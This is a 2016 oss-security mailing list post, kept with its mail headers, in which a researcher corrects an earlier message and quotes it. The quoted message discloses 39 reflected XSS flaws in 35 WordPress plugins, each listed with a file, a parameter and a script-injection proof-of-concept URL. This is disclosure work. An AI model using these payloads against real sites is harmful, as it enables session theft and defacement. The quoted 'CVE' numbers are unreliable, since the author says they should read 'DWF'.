X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["11753" "Wednesday" "13" "April" "2016" "08:34:05" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<A8289BA8-C282-48E1-8C37-CF1ED92BC5E9@me.com>" "188" "Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." "^Date:" nil nil "4" "2016041312:34:05" "[oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." (number mark "        larry0@me.co Apr 13  188/11753 " thread-indent "\"Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.\"\n") "<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>" ("<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 19503 invoked by uid 550); 13 Apr 2016 12:34:22 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19485 invoked from network); 13 Apr 2016 12:34:21 -0000
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-04-13_08:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1510270003 definitions=main-1604130182
Content-type: text/plain; charset=us-ascii
MIME-version: 1.0 (Mac OS X Mail 9.2 \(3112\))
In-reply-to: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
Content-transfer-encoding: quoted-printable
Message-id: <A8289BA8-C282-48E1-8C37-CF1ED92BC5E9@me.com>
References: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
X-Mailer: Apple Mail (2.3112)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1460550845; bh=7g/Evtqo/lixbb+aR7S96F1QIEsKyJhW7AkdLzlPV9Q=;
	h=Content-type:MIME-version:Subject:From:Date:Message-id:To;
	b=CnQptglCpo018o8vN38KSGD0IKVoatQjXjkJm57fOy8re7jejDREZZZOt2HupNaiX
 DyuaCqFq/MCB46RsSEfWj0byqzpBWRXEhLu9koQOy5zNpqzSPWKFhAOxEKfA7/l222
 wVERote7WrzS2/zRJqC8oMmuMYds4Hcxu4Puv6E1DehprrAtQOZRwbwxNmpzCdY8Sb
 z2qEgDLPylG7om1+Fg58TJHJLKL/ONWyEuCMBRnEpATS1oA3fEBbsNBq7aEHpjkk/c
 3WW+KyhcOfcifZ2pY7MMZlEQfW3wqPNe165A4VtcIRZI8GajWEp63cE3NwKBPGOi2J
 3APJ92jVQse6w==
Date: Wed, 13 Apr 2016 08:34:05 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.
To: oss-security@lists.openwall.com

Hello List,

This was meant to be s/CVE/DWF/g thanks Henri for catching that.

-- Larry


> On Apr 12, 2016, at 8:48 AM, Larry W. Cashdollar <larry0@me.com> wrote:
>=20
> Hello List,
>=20
>=20
> This was a project I worked on as part of my research in Akamai's SIRT, I=
 initially found 1352 suspect XSS vulnerabilities but Wordpress escapes sup=
er globals GET/POST/REQUEST
> https://core.trac.wordpress.org/ticket/18322.  I didn't know this at the =
time, so now I have a database of vulnerabilities that are context dependen=
t and would need to be examined
> individually.  I managed to automate XSS testing against the database and=
 of 1352 39 successfully executed javascript.  These are those 39, I've man=
ually verified they're still vulnerable.
>=20
> They're available here http://www.vapidlabs.com/wp/wp.php
>=20
> I notified Wordpress back in February of my research.
>=20
>=20
> Plugin:https://wordpress.org/plugins/mousewheel-smooth-scroll File:./mous=
ewheel-smooth-scroll/js/wpmss.php Parameter:ease  speed step CVE-2016-77447=
 PoC:hxxp://[target]/wp-content/plugins/mousewheel-smooth-scroll/js/wpmss.p=
hp?step=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/indexisto File:./indexisto/assets/js=
/indexisto-inject.php Parameter:indexisto_index CVE-2016-77360 PoC:hxxp://[=
target]/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexis=
to_index=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/prettypre File:./prettypre/prettypre=
css.php Parameter:ts CVE-2016-77548 PoC:hxxp://[target]/wp-content/plugins/=
prettypre/prettyprecss.php?ts=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/whizz File:./whizz/plugins/delete-pl=
ugin.php Parameter:plugin CVE-2016-77799 PoC:hxxp://[target]/wp-content/plu=
gins/whizz/plugins/delete-plugin.php?plugin=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/mypuzzle-jigsaw File:./mypuzzle-jigs=
aw/getGallery.php Parameter:callback CVE-2016-77465 PoC:hxxp://[target]/wp-=
content/plugins/mypuzzle-jigsaw/getGallery.php?callback=3D"><script>alert(1=
);</script><"
> Plugin:https://wordpress.org/plugins/anti-plagiarism File:./anti-plagiari=
sm/js.php Parameter:m CVE-2016-77035 PoC:hxxp://[target]/wp-content/plugins=
/anti-plagiarism/js.php?m=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/qoate-scroll-triggered-box File:./qo=
ate-scroll-triggered-box/assets/js/script.php Parameter:anim perc sac vpos =
CVE-2016-77559 PoC:hxxp://[target]/wp-content/plugins/qoate-scroll-triggere=
d-box/assets/js/script.php?anim=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/s3-video File:./s3-video/views/video=
-management/preview_video.php Parameter:media CVE-2016-77600 PoC:hxxp://[ta=
rget]/wp-content/plugins/s3-video/views/video-management/preview_video.php?=
media=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/wpsolr-search-engine File:./wpsolr-s=
earch-engine/classes/extensions/managed-solr-servers/templates/template-my-=
accounts.php Parameter:page  tab CVE-2016-77958 PoC:hxxp://[target]/wp-cont=
ent/plugins/wpsolr-search-engine/classes/extensions/managed-solr-servers/te=
mplates/template-my-accounts.php?page=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/page-layout-builder File:./page-layo=
ut-builder/includes/layout-settings.php Parameter:layout_settings_id CVE-20=
16-77503 PoC:hxxp://[target]/wp-content/plugins/page-layout-builder/include=
s/layout-settings.php?layout_settings_id=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/mypuzzle-sliding File:./mypuzzle-sli=
ding/getGallery.php Parameter:callback CVE-2016-77466 PoC:hxxp://[target]/w=
p-content/plugins/mypuzzle-sliding/getGallery.php?callback=3D"><script>aler=
t(1);</script><"
> Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/date_s=
elect.php Parameter:date-from date-to CVE-2016-77217 PoC:hxxp://[target]/wp=
-content/plugins/e-search/tmpl/date_select.php?date-from=3D"><script>alert(=
1);</script><"
> Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/title_=
az.php Parameter:title_az CVE-2016-77217 PoC:hxxp://[target]/wp-content/plu=
gins/e-search/tmpl/title_az.php?title_az=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/tidio-gallery File:./tidio-gallery/p=
opup-insert-help.php Parameter:galleryId id  tidio-gallery CVE-2016-77727 P=
oC:hxxp://[target]/wp-content/plugins/tidio-gallery/popup-insert-help.php?g=
alleryId=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/parsi-font File:./parsi-font/css.php=
 Parameter:font size CVE-2016-77506 PoC:hxxp://[target]/wp-content/plugins/=
parsi-font/css.php?size=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/defa-online-image-protector File:./d=
efa-online-image-protector/redirect.php Parameter:r CVE-2016-77193 PoC:hxxp=
://[target]/wp-content/plugins/defa-online-image-protector/redirect.php?r=
=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/new-year-firework File:./new-year-fi=
rework/firework/index.php Parameter:music text url CVE-2016-77475 PoC:hxxp:=
//[target]/wp-content/plugins/new-year-firework/firework/index.php?text=3D"=
><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/simpel-reserveren File:./simpel-rese=
rveren/edit.php Parameter:page CVE-2016-77628 PoC:hxxp://[target]/wp-conten=
t/plugins/simpel-reserveren/edit.php?page=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/groupon-widget File:./groupon-widget=
/widget.css.php Parameter:grpn_wdgt_get_it_btn_background grpn_wdgt_link_co=
lor grpn_wdgt_price_tag_background grpn_wdgt_shell_background grpn_wdgt_tex=
t_color grpn_wdgt_title_color CVE-2016-77332 PoC:hxxp://[target]/wp-content=
/plugins/groupon-widget/widget.css.php?grpn_wdgt_shell_background=3D"><scri=
pt>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/wp-notifications File:./wp-notificat=
ions/css/ln_livenotifications_css.php Parameter:banner_bgcolor dropdown_bit=
_bgcolor dropdown_bit_color dropdown_boder_color dropdown_color dropdown_ho=
ver_bgcolor dropdown_link_color CVE-2016-77885 PoC:hxxp://[target]/wp-conte=
nt/plugins/wp-notifications/css/ln_livenotifications_css.php?dropdown_color=
=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/wp-latest-posts File:./wp-latest-pos=
ts/js/wpcufpn_front.js.php Parameter:id CVE-2016-77873 PoC:hxxp://[target]/=
wp-content/plugins/wp-latest-posts/js/wpcufpn_front.js.php?id=3D"><script>a=
lert(1);</script><"
> Plugin:https://wordpress.org/plugins/ajax-random-post File:./ajax-random-=
post/js.php Parameter:count interval CVE-2016-77022 PoC:hxxp://[target]/wp-=
content/plugins/ajax-random-post/js.php?interval=3D"><script>alert(1);</scr=
ipt><"
> Plugin:https://wordpress.org/plugins/admin-font-editor File:./admin-font-=
editor/css.php Parameter:font size CVE-2016-77009 PoC:hxxp://[target]/wp-co=
ntent/plugins/admin-font-editor/css.php?size=3D"><script>alert(1);</script>=
<"
> Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/playlist.ph=
p Parameter:playlist CVE-2016-77337 PoC:hxxp://[target]/wp-content/plugins/=
hdw-tube/playlist.php?playlist=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/mychannel.p=
hp Parameter:channel CVE-2016-77337 PoC:hxxp://[target]/wp-content/plugins/=
hdw-tube/mychannel.php?channel=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/lbak-google-checkout File:./lbak-goo=
gle-checkout/css/googlecheckout.php Parameter:ih iw ph pw tc CVE-2016-77395=
 PoC:hxxp://[target]/wp-content/plugins/lbak-google-checkout/css/googlechec=
kout.php?pw=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/razuna-media-manager File:./razuna-m=
edia-manager/pages/ajax/razuna-upload-callback.php Parameter:message respon=
secode CVE-2016-77577 PoC:hxxp://[target]/wp-content/plugins/razuna-media-m=
anager/pages/ajax/razuna-upload-callback.php?responsecode=3D"><script>alert=
(1);</script><"
> Plugin:https://wordpress.org/plugins/mypuzzle-find-the-pair-a-memory-game=
 File:./mypuzzle-find-the-pair-a-memory-game/ftpair-getCardImages.php Param=
eter:callback CVE-2016-77464 PoC:hxxp://[target]/wp-content/plugins/mypuzzl=
e-find-the-pair-a-memory-game/ftpair-getCardImages.php?callback=3D"><script=
>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/surveymonkey-button File:./surveymon=
key-button/start_survey.php Parameter:jqueryPepPath CVE-2016-77702 PoC:hxxp=
://[target]/wp-content/plugins/surveymonkey-button/start_survey.php?jqueryP=
epPath=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/hero-maps-pro File:./hero-maps-pro/v=
iews/dashboard/index.php Parameter:p v CVE-2016-77341 PoC:hxxp://[target]/w=
p-content/plugins/hero-maps-pro/views/dashboard/index.php?v=3D"><script>ale=
rt(1);</script><"
> Plugin:https://wordpress.org/plugins/bbpress-social-network File:./bbpres=
s-social-network/css/ln_livenotifications_css.php Parameter:banner_bgcolor =
dropdown_bit_bgcolor dropdown_bit_color dropdown_boder_color dropdown_color=
 dropdown_hover_bgcolor dropdown_link_color CVE-2016-77074 PoC:hxxp://[targ=
et]/wp-content/plugins/bbpress-social-network/css/ln_livenotifications_css.=
php?dropdown_color=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/bbpress-social-network File:./bbpres=
s-social-network/css/ln_livenotifications_cssback.php Parameter:banner_bgco=
lor dropdown_bgcolor dropdown_bit_bgcolor dropdown_bit_color dropdown_boder=
_color dropdown_color dropdown_hover_bgcolor dropdown_link_color CVE-2016-7=
7074 PoC:hxxp://[target]/wp-content/plugins/bbpress-social-network/css/ln_l=
ivenotifications_cssback.php?dropdown_bgcolor=3D"><script>alert(1);</script=
><"
> Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/commo=
n/inc/pages/edit_styles.php Parameter:gid CVE-2016-77517 PoC:hxxp://[target=
]/wp-content/plugins/photoxhibit/common/inc/pages/edit_styles.php?gid=3D"><=
script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/commo=
n/inc/pages/build.php Parameter:gid CVE-2016-77517 PoC:hxxp://[target]/wp-c=
ontent/plugins/photoxhibit/common/inc/pages/build.php?gid=3D"><script>alert=
(1);</script><"
> Plugin:https://wordpress.org/plugins/pondol-formmail File:./pondol-formma=
il/pages/admin-mail-info.php Parameter:itemid CVE-2016-77532 PoC:hxxp://[ta=
rget]/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid=
=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/heat-trackr File:./heat-trackr/heat-=
trackr_abtest_add.php Parameter:id N  WPSLT CVE-2016-77339 PoC:hxxp://[targ=
et]/wp-content/plugins/heat-trackr/heat-trackr_abtest_add.php?id=3D"><scrip=
t>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/tidio-form File:./tidio-form/popup-i=
nsert-help.php Parameter:formId id  tidio-form CVE-2016-77726 PoC:hxxp://[t=
arget]/wp-content/plugins/tidio-form/popup-insert-help.php?formId=3D"><scri=
pt>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/simplified-content File:./simplified=
-content/ooawpframework/js/ajax/OOAAjax.js.php Parameter:ajaxURL CVE-2016-7=
7642 PoC:hxxp://[target]/wp-content/plugins/simplified-content/ooawpframewo=
rk/js/ajax/OOAAjax.js.php?ajaxURL=3D"><script>alert(1);</script><"
> Plugin:https://wordpress.org/plugins/infusionsoft File:./infusionsoft/Inf=
usionsoft/examples/leadscoring.php Parameter:ContactId CVE-2016-77364 PoC:h=
xxp://[target]/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadsc=
oring.php?ContactId=3D"><script>alert(1);</script><"

